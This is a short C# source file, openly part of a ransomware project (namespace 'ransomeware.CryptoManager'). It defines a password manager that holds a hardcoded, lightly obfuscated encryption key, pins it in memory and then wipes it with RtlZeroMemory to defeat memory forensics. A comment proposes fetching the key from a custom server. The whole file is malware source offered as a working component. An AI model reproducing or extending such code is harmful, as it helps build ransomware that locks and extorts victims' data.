using System;
using System.Runtime.InteropServices;

namespace ransomeware.CryptoManager
{
    class PasswordManager
    {
        // used to clear password from memory
        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        protected static extern bool ZeroMemory(IntPtr Destination, int Length);

        protected String password;
        protected GCHandle gch;

        public void FetchPassword()
        {
            /* a more secure way for fetching the password would be prefered,
             * eg. running a dict attack against a custom server.
            */
            this.password = "Aa!C?wp1',M37uLK+l}heoKodA0WdR#,\\TO?,s{vH6[;(ERp1>L)5E<]mxFOkY".Replace("a", "c");
        }

        public void PinPasswordToMemory()
        {
            this.gch = GCHandle.Alloc(this.password, GCHandleType.Pinned);
        }

        public void ClearPasswordFromMemory()
        {
            ZeroMemory(this.gch.AddrOfPinnedObject(), this.password.Length * 2);
            this.gch.Free();
        }

        public String PasswordClearTest()
        {
            return "" + this.password;
        }

    }
}
